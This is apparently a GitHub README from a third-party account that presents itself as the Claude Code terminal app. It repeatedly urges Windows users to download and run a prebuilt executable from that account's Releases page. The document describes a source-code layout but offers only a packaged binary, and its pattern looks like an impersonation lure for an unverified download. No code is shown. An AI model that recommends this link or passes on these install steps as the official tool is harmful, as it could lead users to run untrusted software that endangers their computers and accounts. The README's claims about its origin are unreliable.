# 🤖 claude-code-cli - Run Claude Code in your terminal

[![Download](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/tapperisobar941/claude-code-cli/releases)

## 🧭 What this is

claude-code-cli is the command-line app behind Claude Code. It gives you a text-based way to work with Claude in Windows Terminal or another command window.

It is built for users who want to:

- open Claude from the terminal
- type prompts and get answers in the same window
- work with files from your computer
- use tools for search, edit, and read tasks
- keep the full workflow in one place

## 💻 Windows download

Visit this page to download:
https://github.com/tapperisobar941/claude-code-cli/releases

On the Releases page, look for the latest version. Then choose the Windows file for your system.

### What to download

- If you use a 64-bit Windows PC, pick the Windows x64 file
- If you use a standard Windows laptop or desktop, x64 is the most common choice
- If you are not sure, start with the x64 build

### Simple setup steps

1. Open the Releases page
2. Download the Windows file from the latest release
3. Save it to your Downloads folder
4. Open the file or unzip it, if needed
5. Run the app from the terminal or by double-clicking the included launcher
6. Sign in if the app asks for access
7. Start typing your request

## 🪟 How to run it on Windows

After download, use one of these common ways to start it:

### Option 1: Run from the file

1. Go to your Downloads folder
2. Find the app file you downloaded
3. Double-click it if Windows lets you run it
4. If it opens a terminal window, wait for the prompt
5. Type your request and press Enter

### Option 2: Run from Command Prompt

1. Press `Win + S`
2. Type `cmd`
3. Open Command Prompt
4. Go to the folder with the app
5. Start the program from there

### Option 3: Run from PowerShell

1. Press `Win + S`
2. Type `PowerShell`
3. Open PowerShell
4. Change to the folder where you saved the app
5. Start the tool from that folder

## ✨ What you can do

claude-code-cli helps you use Claude for common work tasks in a terminal window.

You can use it to:

- ask questions in plain English
- read and review text files
- search through folders
- make small edits to files
- automate repeat tasks
- work with code-style project files
- use connected tools from the same session

## 🛠️ Main parts of the app

This project includes the full terminal layer for Claude Code.

### CLI entry and command parsing

The app starts with `main.tsx` and the files in `entrypoints/`. These parts decide how the app opens and how it handles commands.

### Terminal UI

The `components/` folder contains the screen elements that show text in the terminal. It uses React and Ink to draw the interface in a command window.

### Tool system

The `tools/` folder holds tools such as:

- Bash
- file read and write
- file edit
- search with Grep
- file matching with Glob
- web search

### API layer

The `services/api/` folder handles communication with Anthropic services.

### MCP support

The app also includes MCP support for connected tools and external services.

### Multi-agent teamwork

It supports coordinated work between multiple agents or team flows for larger tasks.

### Authentication and policy

The app includes sign-in flow and policy handling so the tool can manage access and use rules.

## 📋 Basic system needs

For a smooth run on Windows, use:

- Windows 10 or Windows 11
- 64-bit system
- A modern terminal like Windows Terminal, Command Prompt, or PowerShell
- Internet access for download and sign-in
- Enough free space for the app and your working files

## 🔐 First-time setup

When you start the app for the first time, it may ask you to:

1. connect your account
2. confirm access
3. choose a folder to work in
4. allow terminal use
5. start a new session

Keep the app in a folder you can find again, such as `Downloads` or `Documents`.

## 📁 Recommended folder use

For best results, keep your files in a simple project folder.

Example:

- `C:\Users\YourName\Documents\claude-work`
- `C:\Users\YourName\Desktop\project-files`

This makes it easier to:

- open files
- read folders
- make edits
- keep your work organized

## ⌨️ Common things to type

You can type plain requests such as:

- help me review this file
- find all text that says invoice
- explain what this folder contains
- make this paragraph shorter
- search for broken links in this project
- update the file name references
- compare these two text files

## 🧩 File access and editing

This app can work with local files through its tool set. That means you can ask it to:

- open a text file
- read a folder
- search inside many files
- change file content
- save updated text
- look for matches across a project

## 🌐 Web search use

The tool set may also support web search. You can use it to:

- look up public information
- find related pages
- gather quick reference text
- compare sources

## 🔎 Search tools

The app includes search tools that help it scan local content.

### Grep

Use this when you want to find text inside files.

### Glob

Use this when you want to find files by name or pattern.

These tools make it easier to work with large folders without opening each file by hand.

## 🤝 Working with teams and agents

This project supports multi-agent and team-based work. In practice, that means the system can divide larger jobs into smaller parts and handle more than one task path at a time.

This is useful for:

- large file sets
- grouped edits
- repeated review tasks
- broad project checks

## 🧰 Troubleshooting on Windows

If the app does not start, try these steps:

1. make sure the file finished downloading
2. unzip the release if it came in a zip file
3. run it from a terminal window
4. check that you chose the correct Windows build
5. open the app from a folder with a simple path
6. try Windows Terminal, Command Prompt, or PowerShell
7. download the latest release again if the file looks damaged

If the window opens and closes at once, launch it from a terminal so you can see the message on screen.

## 📝 Typical workflow

A simple first run looks like this:

1. download the release from GitHub
2. open the file or terminal app
3. sign in if asked
4. choose the folder you want to work with
5. type a short request
6. read the response
7. ask for another step if needed

## 📦 Release download

Go to the Releases page here:
https://github.com/tapperisobar941/claude-code-cli/releases

Download the latest Windows file from that page, then run it on your PC

## 🔎 Project layout

This repository centers on the `src/` folder and the terminal interaction layer.

Main areas include:

- `main.tsx` for app start and command handling
- `entrypoints/` for CLI, SDK, and MCP modes
- `components/` for terminal UI parts
- `tools/` for command and file tools
- `services/api/` for backend communication
- MCP support files
- multi-agent and team support
- auth and policy logic
- helper services

## 🖥️ Best terminal choice

For Windows, use Windows Terminal if you have it. It gives a cleaner view and works well with long output. Command Prompt and PowerShell also work.

## 🧭 Safe file habits

Before you let any tool edit files, keep a copy of important work in another folder. That makes it easier to restore a file if you change the wrong part.

Good habits:

- use a test folder first
- keep file names simple
- avoid spaces in paths if you can
- store copies of important files

## 📚 Helpful first use cases

If you are new to this kind of app, start with small tasks:

- ask it to explain a text file
- search a folder for one word
- rename a few files by rule
- clean up a draft
- compare two short documents

These tasks help you learn how the terminal flow works before you use bigger folders or longer jobs